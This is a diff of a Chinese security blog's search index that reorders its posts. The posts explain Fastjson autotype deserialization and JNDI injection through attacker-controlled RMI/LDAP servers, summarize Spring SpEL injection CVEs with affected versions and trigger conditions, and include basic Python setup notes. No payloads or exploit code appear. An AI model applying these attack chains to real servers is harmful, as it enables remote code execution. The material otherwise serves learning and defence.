@@ -1,39 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Fastjson漏洞详解</title>
-    <url>/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h1><p>fastjson是阿里巴巴开发的java语言编写的高性能json库，可以解析json格式的字符串，支持将java bean序列化为json字符串，也可以将json反序列化为java bean字符串。fastjson接口简单易用，广泛适用在缓存序列化、协议交互、web输出、安卓客户端等。目前有2个接口toJsonString和parseObject来分别实现序列化和反序列化。</p>
-<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>fastjson提供了autotype功能，允许用户在反序列化数据中通过”@type”指定反序列化的类型，fastjson自定义的反序列化机制时会调用指定类中的getter和setter方法，那么当组件开启了autotype功能并且反序列化不可信数据的时候，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter、getter方法中。</p>
-<p>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
-<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>简单来说，JNDI (Java Naming and Directory Interface)  是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
-<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：</p>
-<p><strong>DNS、LDAP、 CORBA对象服务、RMI！</strong></p>
-<h1 id="Fastjson漏洞总结"><a href="#Fastjson漏洞总结" class="headerlink" title="Fastjson漏洞总结"></a>Fastjson漏洞总结</h1><ol>
-<li>反序列化常用的两种方式一种基于rmi一种基于ldap</li>
-<li>RMI是一种行为，指的是Java远程方法调用</li>
-<li>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找相关的对象，并把他下载到客户端来</li>
-<li>ldap指的是轻量级目录访问协议</li>
-</ol>
-<p>存在java版本的限制</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。</span><br><span class="line">在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line">基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</span><br><span class="line">在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。</span><br><span class="line">可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</span><br></pre></td></tr></table></figure>
-
-<h2 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>漏洞原理</p>
-<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
-<p>通俗理解就是：漏洞是利用fastjson  autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</p>
-<p>影响版本</p>
-<p>Fastjson &lt; 1.2.25</p>
-]]></content>
-      <categories>
-        <category>其他漏洞</category>
-      </categories>
-      <tags>
-        <tag>Fastjson漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HW蓝队面试</title>
     <url>/2022/03/28/HW%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/</url>
     <content><![CDATA[<span id="more"></span>
@@ -141,42 +108,36 @@
       </tags>
   </entry>
   <entry>
-    <title>Python自学笔记</title>
-    <url>/2022/02/04/Python%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
+    <title>Fastjson漏洞详解</title>
+    <url>/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<span id="more"></span>
 
-<p>自行安装pycharm</p>
-<p>自行安装anaconda</p>
-<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="1-使用conda安装虚拟环境"><a href="#1-使用conda安装虚拟环境" class="headerlink" title="1.使用conda安装虚拟环境"></a>1.使用conda安装虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行输入</span><br><span class="line">conda info -e</span><br></pre></td></tr></table></figure>
+<h1 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h1><p>fastjson是阿里巴巴开发的java语言编写的高性能json库，可以解析json格式的字符串，支持将java bean序列化为json字符串，也可以将json反序列化为java bean字符串。fastjson接口简单易用，广泛适用在缓存序列化、协议交互、web输出、安卓客户端等。目前有2个接口toJsonString和parseObject来分别实现序列化和反序列化。</p>
+<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>fastjson提供了autotype功能，允许用户在反序列化数据中通过”@type”指定反序列化的类型，fastjson自定义的反序列化机制时会调用指定类中的getter和setter方法，那么当组件开启了autotype功能并且反序列化不可信数据的时候，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter、getter方法中。</p>
+<p>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>简单来说，JNDI (Java Naming and Directory Interface)  是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
+<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：</p>
+<p><strong>DNS、LDAP、 CORBA对象服务、RMI！</strong></p>
+<h1 id="Fastjson漏洞总结"><a href="#Fastjson漏洞总结" class="headerlink" title="Fastjson漏洞总结"></a>Fastjson漏洞总结</h1><ol>
+<li>反序列化常用的两种方式一种基于rmi一种基于ldap</li>
+<li>RMI是一种行为，指的是Java远程方法调用</li>
+<li>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找相关的对象，并把他下载到客户端来</li>
+<li>ldap指的是轻量级目录访问协议</li>
+</ol>
+<p>存在java版本的限制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。</span><br><span class="line">在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line">基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</span><br><span class="line">在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。</span><br><span class="line">可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327135645297.png" alt="image-20220327135645297"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python查看版本号</span><br><span class="line">python --version</span><br><span class="line">conda create -n pr python=3.7.6 </span><br><span class="line">y</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate pr</span><br><span class="line">conda install pip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327141528418.png" alt="image-20220327141528418"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开notebook，直接在命令行输入</span><br><span class="line">jupyter-notebook</span><br><span class="line">配置代码自动补全功能</span><br><span class="line">pip install jupyter_contrib_nbextensions</span><br><span class="line">继续配置</span><br><span class="line">jupyter contrib nbextension install --user</span><br><span class="line">关掉notebook，然后再此打开，就会发现多了一处选项，打开，勾选Hinterland</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143747001.png" alt="image-20220327143747001"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143940707.png" alt="image-20220327143940707"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调整notebook的背景色</span><br><span class="line">pip install jupyterthemes</span><br><span class="line">选择主题</span><br><span class="line">jt -t onedork -f roboto -fs 16 -nfs 16 -tfs 16 -ofs 15</span><br><span class="line">重新打开</span><br><span class="line">jupyter-notebook</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="x2F-除法-x2F-x2F-向下取整"><a href="#x2F-除法-x2F-x2F-向下取整" class="headerlink" title="&#x2F;除法&#x2F;&#x2F;向下取整"></a>&#x2F;除法&#x2F;&#x2F;向下取整</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152252215.png" alt="image-20220327152252215"></p>
-<h2 id="取余"><a href="#取余" class="headerlink" title="%取余"></a>%取余</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152903213.png" alt="image-20220327152903213"></p>
-<h2 id="5的2次幂"><a href="#5的2次幂" class="headerlink" title="5的2次幂"></a>5的2次幂</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153153305.png" alt="image-20220327153153305"></p>
-<h2 id="5的绝对值abs-5"><a href="#5的绝对值abs-5" class="headerlink" title="-5的绝对值abs(-5)"></a>-5的绝对值abs(-5)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153306901.png" alt="image-20220327153306901"></p>
-<h2 id="十进制转十六进制hex-10"><a href="#十进制转十六进制hex-10" class="headerlink" title="十进制转十六进制hex(10)"></a>十进制转十六进制hex(10)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153508513.png" alt="image-20220327153508513"></p>
-<h2 id="二进制转十进制int-‘1001’-base-x3D-2"><a href="#二进制转十进制int-‘1001’-base-x3D-2" class="headerlink" title="二进制转十进制int(‘1001’,base&#x3D;2)"></a>二进制转十进制int(‘1001’,base&#x3D;2)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153637234.png" alt="image-20220327153637234"></p>
-<h2 id="A的ASCII码ord-‘A’"><a href="#A的ASCII码ord-‘A’" class="headerlink" title="A的ASCII码ord(‘A’)"></a>A的ASCII码ord(‘A’)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327154438608.png" alt="image-20220327154438608"></p>
-<h2 id="65对应的ASCII码chr-65"><a href="#65对应的ASCII码chr-65" class="headerlink" title="65对应的ASCII码chr(65)"></a>65对应的ASCII码chr(65)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327155252656.png" alt="image-20220327155252656"></p>
+<h2 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>漏洞原理</p>
+<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
+<p>通俗理解就是：漏洞是利用fastjson  autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</p>
+<p>影响版本</p>
+<p>Fastjson &lt; 1.2.25</p>
 ]]></content>
       <categories>
-        <category>Python</category>
+        <category>其他漏洞</category>
       </categories>
       <tags>
-        <tag>Python</tag>
+        <tag>Fastjson漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -230,6 +191,88 @@
       </categories>
       <tags>
         <tag>Shiro框架漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python自学笔记</title>
+    <url>/2022/02/04/Python%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<p>自行安装pycharm</p>
+<p>自行安装anaconda</p>
+<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="1-使用conda安装虚拟环境"><a href="#1-使用conda安装虚拟环境" class="headerlink" title="1.使用conda安装虚拟环境"></a>1.使用conda安装虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行输入</span><br><span class="line">conda info -e</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327135645297.png" alt="image-20220327135645297"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python查看版本号</span><br><span class="line">python --version</span><br><span class="line">conda create -n pr python=3.7.6 </span><br><span class="line">y</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate pr</span><br><span class="line">conda install pip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327141528418.png" alt="image-20220327141528418"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开notebook，直接在命令行输入</span><br><span class="line">jupyter-notebook</span><br><span class="line">配置代码自动补全功能</span><br><span class="line">pip install jupyter_contrib_nbextensions</span><br><span class="line">继续配置</span><br><span class="line">jupyter contrib nbextension install --user</span><br><span class="line">关掉notebook，然后再此打开，就会发现多了一处选项，打开，勾选Hinterland</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143747001.png" alt="image-20220327143747001"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143940707.png" alt="image-20220327143940707"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调整notebook的背景色</span><br><span class="line">pip install jupyterthemes</span><br><span class="line">选择主题</span><br><span class="line">jt -t onedork -f roboto -fs 16 -nfs 16 -tfs 16 -ofs 15</span><br><span class="line">重新打开</span><br><span class="line">jupyter-notebook</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="x2F-除法-x2F-x2F-向下取整"><a href="#x2F-除法-x2F-x2F-向下取整" class="headerlink" title="&#x2F;除法&#x2F;&#x2F;向下取整"></a>&#x2F;除法&#x2F;&#x2F;向下取整</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152252215.png" alt="image-20220327152252215"></p>
+<h2 id="取余"><a href="#取余" class="headerlink" title="%取余"></a>%取余</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152903213.png" alt="image-20220327152903213"></p>
+<h2 id="5的2次幂"><a href="#5的2次幂" class="headerlink" title="5的2次幂"></a>5的2次幂</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153153305.png" alt="image-20220327153153305"></p>
+<h2 id="5的绝对值abs-5"><a href="#5的绝对值abs-5" class="headerlink" title="-5的绝对值abs(-5)"></a>-5的绝对值abs(-5)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153306901.png" alt="image-20220327153306901"></p>
+<h2 id="十进制转十六进制hex-10"><a href="#十进制转十六进制hex-10" class="headerlink" title="十进制转十六进制hex(10)"></a>十进制转十六进制hex(10)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153508513.png" alt="image-20220327153508513"></p>
+<h2 id="二进制转十进制int-‘1001’-base-x3D-2"><a href="#二进制转十进制int-‘1001’-base-x3D-2" class="headerlink" title="二进制转十进制int(‘1001’,base&#x3D;2)"></a>二进制转十进制int(‘1001’,base&#x3D;2)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153637234.png" alt="image-20220327153637234"></p>
+<h2 id="A的ASCII码ord-‘A’"><a href="#A的ASCII码ord-‘A’" class="headerlink" title="A的ASCII码ord(‘A’)"></a>A的ASCII码ord(‘A’)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327154438608.png" alt="image-20220327154438608"></p>
+<h2 id="65对应的ASCII码chr-65"><a href="#65对应的ASCII码chr-65" class="headerlink" title="65对应的ASCII码chr(65)"></a>65对应的ASCII码chr(65)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327155252656.png" alt="image-20220327155252656"></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring框架漏洞</title>
+    <url>/2022/01/25/Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="Spring框架漏洞总结"><a href="#Spring框架漏洞总结" class="headerlink" title="Spring框架漏洞总结"></a>Spring框架漏洞总结</h1><p>spring是java EE的一个轻量级开源框架，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL，具有了安全风险。</p>
+<h2 id="SpEL是什么"><a href="#SpEL是什么" class="headerlink" title="SpEL是什么"></a>SpEL是什么</h2><p>SpEL(Spring Expression  Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。</p>
+<h2 id="SpEL原理"><a href="#SpEL原理" class="headerlink" title="SpEL原理"></a>SpEL原理</h2><p><a href="http://rui0.cn/archives/1043">参考链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表达式：传入的字符串内容。</span><br><span class="line">解析器：将字符串解析为表达式内容。</span><br><span class="line">上下文：表达式对象执行的环境。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Spring框架特征"><a href="#Spring框架特征" class="headerlink" title="Spring框架特征"></a>Spring框架特征</h2><p>1.看web应用的ico小图标，是个小绿叶子</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085400267.png" alt="image-20220329085400267"></p>
+<p>2.看报错页面</p>
+<p>3.wappalyzer插件识别</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085605143.png" alt="image-20220329085605143"></p>
+<p>4.F12开发者模式看关键字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085655536.png" alt="image-20220329085655536"></p>
+<h2 id="Spring-Security-OAuth2-远程命令执行（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行（CVE-2016-4977）</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Security OAuth2是Spring框架提供安全认证支持的一个模块。Spring Security OAuth2处理认证请求的时候使用了whitelabel views，response_type参数值会被当作Spring SpEL来执行，攻击者可以在被授权的情况下通过构造response_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0.0-2.0.9</span><br><span class="line">1.0.0-1.0.5</span><br></pre></td></tr></table></figure>
+
+<h2 id="Spring-Web-Flow框架远程代码执行-CVE-2017-4971"><a href="#Spring-Web-Flow框架远程代码执行-CVE-2017-4971" class="headerlink" title="Spring Web Flow框架远程代码执行(CVE-2017-4971)"></a>Spring Web Flow框架远程代码执行(CVE-2017-4971)</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。</p>
+<p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring WebFlow 2.4.0 - 2.4.4</span><br></pre></td></tr></table></figure>
+
+<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值）</span><br><span class="line">flow view对象中设置BinderConfiguration对象为空</span><br></pre></td></tr></table></figure>
+
+<h2 id="Spring-Data-Rest远程命令执行命令-CVE-2017-8046"><a href="#Spring-Data-Rest远程命令执行命令-CVE-2017-8046" class="headerlink" title="Spring Data Rest远程命令执行命令(CVE-2017-8046)"></a>Spring Data Rest远程命令执行命令(CVE-2017-8046)</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。</p>
+<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</span><br><span class="line">Spring Boot version &lt; 2.0.0M4</span><br><span class="line">Spring Data release trains &lt; Kay-RC3</span><br></pre></td></tr></table></figure>
+
+<h2 id="Spring-Messaging远程命令执行突破-CVE-2018-1270"><a href="#Spring-Messaging远程命令执行突破-CVE-2018-1270" class="headerlink" title="Spring Messaging远程命令执行突破(CVE-2018-1270)"></a>Spring Messaging远程命令执行突破(CVE-2018-1270)</h2><h3 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>spring  messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring  messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。</p>
+<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Framework 5.0 - 5.0.5</span><br><span class="line">Spring Framework 4.3 - 4.3.15</span><br><span class="line">已不支持的旧版本仍然受影响</span><br></pre></td></tr></table></figure>
+
+<h2 id="Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273"><a href="#Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273" class="headerlink" title="Spring Data Commons远程命令执行漏洞(CVE-2018-1273)"></a>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</h2><h3 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring  Data下所有子项目共享的基础框架。Spring Data Commons  在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
+<h3 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 – 2.6.10(Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 – 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 – 3.0.5(Kay SR5)</span><br><span class="line">官方已经不支持的旧版本</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>java框架漏洞</category>
+      </categories>
+      <tags>
+        <tag>Spring框架漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -317,49 +360,6 @@
       </categories>
       <tags>
         <tag>burp suit工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring框架漏洞</title>
-    <url>/2022/01/25/Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="Spring框架漏洞总结"><a href="#Spring框架漏洞总结" class="headerlink" title="Spring框架漏洞总结"></a>Spring框架漏洞总结</h1><p>spring是java EE的一个轻量级开源框架，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL，具有了安全风险。</p>
-<h2 id="SpEL是什么"><a href="#SpEL是什么" class="headerlink" title="SpEL是什么"></a>SpEL是什么</h2><p>SpEL(Spring Expression  Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。</p>
-<h2 id="SpEL原理"><a href="#SpEL原理" class="headerlink" title="SpEL原理"></a>SpEL原理</h2><p><a href="http://rui0.cn/archives/1043">参考链接</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表达式：传入的字符串内容。</span><br><span class="line">解析器：将字符串解析为表达式内容。</span><br><span class="line">上下文：表达式对象执行的环境。</span><br></pre></td></tr></table></figure>
-
-<h2 id="Spring框架特征"><a href="#Spring框架特征" class="headerlink" title="Spring框架特征"></a>Spring框架特征</h2><p>1.看web应用的ico小图标，是个小绿叶子</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085400267.png" alt="image-20220329085400267"></p>
-<p>2.看报错页面</p>
-<p>3.wappalyzer插件识别</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085605143.png" alt="image-20220329085605143"></p>
-<p>4.F12开发者模式看关键字</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085655536.png" alt="image-20220329085655536"></p>
-<h2 id="Spring-Security-OAuth2-远程命令执行（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行（CVE-2016-4977）</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Security OAuth2是Spring框架提供安全认证支持的一个模块。Spring Security OAuth2处理认证请求的时候使用了whitelabel views，response_type参数值会被当作Spring SpEL来执行，攻击者可以在被授权的情况下通过构造response_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0.0-2.0.9</span><br><span class="line">1.0.0-1.0.5</span><br></pre></td></tr></table></figure>
-
